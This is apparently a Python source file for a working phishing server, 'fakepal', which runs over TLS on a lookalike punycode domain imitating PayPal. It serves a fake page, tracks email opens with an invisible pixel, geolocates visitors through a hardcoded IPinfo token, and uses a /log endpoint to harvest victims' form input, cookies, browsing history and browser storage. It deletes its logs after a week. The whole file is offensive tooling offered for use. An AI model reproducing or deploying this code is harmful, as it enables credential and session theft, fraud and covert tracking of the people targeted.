import http.server
import socketserver
import json
import ssl
import os
import signal
import requests
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs

PORT = 443
LOG_DIR = '/root/fakepal/log'
LOG_FILE = os.path.join(LOG_DIR, 'log.txt')
EMAIL_OPEN_LOG_FILE = os.path.join(LOG_DIR, 'email_open_log.txt')
INDEX_PATH = 'index.html'  # Specify the path to your index.html file
IPINFO_TOKEN = 'dac545c0231bf0'  # Add your IPinfo token here

# Ensure the log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

# Change working directory to where index.html is located
os.chdir('/root/fakepal')

class Handler(http.server.SimpleHTTPRequestHandler):
    def log_visitor(self, additional_data=None):
        try:
            visitor_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            location = self.get_location(visitor_ip)
            log_entry = f"Visitor Log - {datetime.now()} - IP: {visitor_ip} - User-Agent: {user_agent} - Location: {location}\n"
            if additional_data:
                log_entry += f"Form Data: {json.dumps(additional_data.get('form_data', {}), indent=2)}\n"
                log_entry += f"Cookies: {additional_data.get('cookies', '')}\n"
                log_entry += f"Client Data:\n{json.dumps(additional_data.get('client_data', {}), indent=2)}\n"
            log_entry += "-" * 40 + "\n"
            self.write_to_log_file(log_entry)
            print(f"Logged visitor: {visitor_ip} - User-Agent: {user_agent} - Location: {location}")
        except Exception as e:
            print(f"Error logging visitor: {e}")

    def get_location(self, ip):
        try:
            response = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}")
            data = response.json()
            return f"{data.get('city', 'Unknown')}, {data.get('region', 'Unknown')}, {data.get('country', 'Unknown')}"
        except Exception as e:
            return "Location lookup failed"

    def validate_path(self, path):
        # Prevent access to the /log directory and LFI by ensuring the path is safe
        normalized_path = os.path.normpath(path)
        if normalized_path.startswith(LOG_DIR):
            print(f"Access to {path} is forbidden")
            return False
        return True

    def do_GET(self):
        print(f"Handling GET request for {self.path}")
        if self.path.startswith('/track-open'):
            self.log_email_open()
            self.send_response(200)
            self.send_header('Content-type', 'image/png')
            self.end_headers()
            self.wfile.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\xdacd\xf8\xff\xff?\x00\x05\xfe\x02\xfeA\x9c\xc0\x00\x00\x00\x00IEND\xaeB`\x82')
            return

        if not self.validate_path(self.path):
            self.send_response(403)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Access forbidden')
            return

        if self.path in ['/', '/n0m4d1k1337', '/n0m4d1k']:
            self.path = INDEX_PATH
        self.log_visitor()
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def log_email_open(self):
        try:
            visitor_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            query_components = parse_qs(urlparse(self.path).query)
            email = query_components.get('email', ['Unknown'])[0]
            location = self.get_location(visitor_ip)
            with open(EMAIL_OPEN_LOG_FILE, 'a') as email_log:
                email_log.write(f"{datetime.now()} - Email opened: {email} - IP: {visitor_ip} - User-Agent: {user_agent} - Location: {location}\n")
            print(f"Logged email open: {email} - IP: {visitor_ip} - User-Agent: {user_agent} - Location: {location}")
        except Exception as e:
            print(f"Error logging email open: {e}")

    def do_POST(self):
        print(f"Handling POST request for {self.path}")
        if not self.validate_path(self.path):
            self.send_response(403)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Access forbidden')
            return

        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)

            if self.path == '/log':
                print(f"Logging data: {data}")

                # Group form data, cookies, and client data
                log_entry = {
                    'form_data': data,
                    'cookies': data.get('cookies', ''),
                    'client_data': {
                        'history': data.get('history', ''),
                        'localStorageData': data.get('localStorageData', ''),
                        'sessionStorageData': data.get('sessionStorageData', ''),
                        'plugins': data.get('plugins', ''),
                        'userAgent': data.get('userAgent', ''),
                    }
                }
                self.log_visitor(additional_data=log_entry)

                # Respond with a success message
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'Data logged successfully')
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            print(f"Error in do_POST: {e}")
            self.send_response(500)
            self.end_headers()

    def write_to_log_file(self, log_entry):
        with open(LOG_FILE, 'a') as log:
            log.write(log_entry)
            log.write("\n")

# Create an SSL context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="/etc/letsencrypt/live/xn--pypl-5q5ac.com-0001/fullchain.pem",
                        keyfile="/etc/letsencrypt/live/xn--pypl-5q5ac.com-0001/privkey.pem")

# Create the server
httpd = socketserver.TCPServer(("", PORT), Handler)
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

def signal_handler(signal, frame):
    print('Stopping server...')
    httpd.server_close()
    print('Server stopped.')
    exit(0)

# Register signal handler for graceful shutdown
signal.signal(signal.SIGINT, signal_handler)

def cleanup_logs():
    now = datetime.now()
    for filename in os.listdir(LOG_DIR):
        file_path = os.path.join(LOG_DIR, filename)
        if os.path.isfile(file_path):
            file_modified_time = datetime.fromtimestamp(os.path.getmtime(file_path))
            if now - file_modified_time > timedelta(days=7):
                os.remove(file_path)
                print(f"Removed old log file: {file_path}")

print(f"Serving at port {PORT}")
cleanup_logs()
httpd.serve_forever()
